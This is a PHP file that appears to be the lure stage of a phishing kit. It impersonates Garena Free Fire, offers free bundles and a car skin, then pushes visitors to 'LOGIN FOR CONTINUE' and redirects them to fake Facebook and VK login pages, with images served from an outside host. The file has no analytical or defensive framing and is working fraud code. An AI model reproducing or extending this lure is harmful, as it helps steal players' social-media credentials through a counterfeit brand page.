<?php 
if(isset($_POST['1'])) {
    $detol = "<div id='menu'>
     <form action='./' method='POST'>
      <center>
      <div id='SetyawanXD'>
        <img class='gambar-atas' src='berkas/images/atas.png' oncontextmenu='return false;'>
      </div>
      <div id='SetyawanXD'>
        <div class='detol-menu'>
        <div class='title-menu'>TAKE THIS BUNDLE ??</div>
        <img class='gambar-menu' src='//detol-store.dns.army/FreeFireTopeng/images/item/1nya.png' oncontextmenu='return false;'>
        <button name='balik' class='btn-kiri'>NO</button>
        <button name='login' class='btn-kanan'>YES</button>
      </div>
      </div>
      <div id='SetyawanXD'>
        <div class='title'>© Garena FreeFire - All right Reserved.</div>
      </div>
      </center>
     </form>
    </div>";
}
elseif(isset($_POST['2'])) {
    $detol = "<div id='menu'>
     <form action='./' method='POST'>
      <center>
      <div id='SetyawanXD'>
        <img class='gambar-atas' src='berkas/images/atas.png' oncontextmenu='return false;'>
      </div>
      <div id='SetyawanXD'>
        <div class='detol-menu'>
        <div class='title-menu'>TAKE THIS BUNDLE ??</div>
        <img class='gambar-menu' src='//detol-store.dns.army/FreeFireTopeng/images/item/2nya.png' oncontextmenu='return false;'>
        <button name='balik' class='btn-kiri'>NO</button>
        <button name='login' class='btn-kanan'>YES</button>
      </div>
      </div>
      <div id='SetyawanXD'>
        <div class='title'>© Garena FreeFire - All right Reserved.</div>
      </div>
      </center>
     </form>
    </div>";
}
elseif(isset($_POST['3'])) {
    $detol = "<div id='menu'>
     <form action='./' method='POST'>
      <center>
      <div id='SetyawanXD'>
        <img class='gambar-atas' src='berkas/images/atas.png' oncontextmenu='return false;'>
      </div>
      <div id='SetyawanXD'>
        <div class='detol-menu'>
        <div class='title-menu'>TAKE THIS BUNDLE ??</div>
        <img class='gambar-menu' src='//detol-store.dns.army/FreeFireTopeng/images/item/3nya.png' oncontextmenu='return false;'>
        <button name='balik' class='btn-kiri'>NO</button>
        <button name='login' class='btn-kanan'>YES</button>
      </div>
      </div>
      <div id='SetyawanXD'>
        <div class='title'>© Garena FreeFire - All right Reserved.</div>
      </div>
      </center>
     </form>
    </div>";
}
elseif(isset($_POST['4'])) {
    $detol = "<div id='menu'>
     <form action='./' method='POST'>
      <center>
      <div id='SetyawanXD'>
        <img class='gambar-atas' src='berkas/images/atas.png' oncontextmenu='return false;'>
      </div>
      <div id='SetyawanXD'>
        <div class='detol-menu'>
        <div class='title-menu'>TAKE THIS BUNDLE ??</div>
        <img class='gambar-menu' src='//detol-store.dns.army/FreeFireTopeng/images/item/4nya.png' oncontextmenu='return false;'>
        <button name='balik' class='btn-kiri'>NO</button>
        <button name='login' class='btn-kanan'>YES</button>
      </div>
      </div>
      <div id='SetyawanXD'>
        <div class='title'>© Garena FreeFire - All right Reserved.</div>
      </div>
      </center>
     </form>
    </div>";
}
elseif(isset($_POST['5'])) {
    $detol = "<div id='menu'>
     <form action='./' method='POST'>
      <center>
      <div id='SetyawanXD'>
        <img class='gambar-atas' src='berkas/images/atas.png' oncontextmenu='return false;'>
      </div>
      <div id='SetyawanXD'>
        <div class='detol-menu'>
        <div class='title-menu'>TAKE THIS BUNDLE ??</div>
        <img class='gambar-menu' src='//detol-store.dns.army/FreeFireTopeng/images/item/5nya.png' oncontextmenu='return false;'>
        <button name='balik' class='btn-kiri'>NO</button>
        <button name='login' class='btn-kanan'>YES</button>
      </div>
      </div>
      <div id='SetyawanXD'>
        <div class='title'>© Garena FreeFire - All right Reserved.</div>
      </div>
      </center>
     </form>
    </div>";
}
elseif(isset($_POST['6'])) {
    $detol = "<div id='menu'>
     <form action='./' method='POST'>
      <center>
      <div id='SetyawanXD'>
        <img class='gambar-atas' src='berkas/images/atas.png' oncontextmenu='return false;'>
      </div>
      <div id='SetyawanXD'>
        <div class='detol-menu'>
        <div class='title-menu'>TAKE THIS BUNDLE ??</div>
        <img class='gambar-menu' src='//detol-store.dns.army/FreeFireTopeng/images/item/6nya.png' oncontextmenu='return false;'>
        <button name='balik' class='btn-kiri'>NO</button>
        <button name='login' class='btn-kanan'>YES</button>
      </div>
      </div>
      <div id='SetyawanXD'>
        <div class='title'>© Garena FreeFire - All right Reserved.</div>
      </div>
      </center>
     </form>
    </div>";
}
elseif(isset($_POST['7'])) {
    $detol = "<div id='menu'>
     <form action='./' method='POST'>
      <center>
      <div id='SetyawanXD'>
        <img class='gambar-atas' src='berkas/images/atas.png' oncontextmenu='return false;'>
      </div>
      <div id='SetyawanXD'>
        <div class='detol-menu'>
        <div class='title-menu'>TAKE THIS SKIN CAR ??</div>
        <img class='gambar-menu' src='//detol-store.dns.army/FreeFireTopeng/images/item/7nya.png' oncontextmenu='return false;'>
        <button name='balik' class='btn-kiri'>NO</button>
        <button name='login' class='btn-kanan'>YES</button>
      </div>
      </div>
      <div id='SetyawanXD'>
        <div class='title'>© Garena FreeFire - All right Reserved.</div>
      </div>
      </center>
     </form>
    </div>";
}
elseif(isset($_POST['8'])) {
    $detol = "<div id='menu'>
     <form action='./' method='POST'>
      <center>
      <div id='SetyawanXD'>
        <img class='gambar-atas' src='berkas/images/atas.png' oncontextmenu='return false;'>
      </div>
      <div id='SetyawanXD'>
        <div class='detol-menu'>
        <div class='title-menu'>TAKE THIS BUNDLE ??</div>
        <img class='gambar-menu' src='//detol-store.dns.army/FreeFireTopeng/images/item/8nya.png' oncontextmenu='return false;'>
        <button name='balik' class='btn-kiri'>NO</button>
        <button name='login' class='btn-kanan'>YES</button>
      </div>
      </div>
      <div id='SetyawanXD'>
        <div class='title'>© Garena FreeFire - All right Reserved.</div>
      </div>
      </center>
     </form>
    </div>";
}
elseif(isset($_POST['login'])) {
    $detol = "<div id='menu'>
     <form action='./' method='POST'>
      <center>
      <div id='SetyawanXD'>
        <img class='gambar-atas' src='berkas/images/atas.png' oncontextmenu='return false;'>
      </div>
      <div id='SetyawanXD'>
        <div class='detol-menu'>
        <div class='title-login'>LOGIN FOR CONTINUE</div>
        <div class='login-kiri'><img class='gambar-login-kiri' src='berkas/images/fb.png' oncontextmenu='return false;'></div>
        <div class='login-kanan'><img class='gambar-login-kanan' src='berkas/images/vk.png' oncontextmenu='return false;'></div>
        <button name='fb' class='btn-login-kiri'>FB LOGIN</button>
        <button name='vk' class='btn-login-kanan'>VK LOGIN</button>
      </div>
      </div>
      <div id='SetyawanXD'>
        <div class='title'>© Garena FreeFire - All right Reserved.</div>
      </div>
      </center>
     </form>
    </div>";
}
elseif(isset($_POST['balik'])) {
header('location: ./');
}
elseif(isset($_POST['fb'])) {
header('location: login-facebook');
}
elseif(isset($_POST['vk'])) {
header('location: login-vk');
}
?>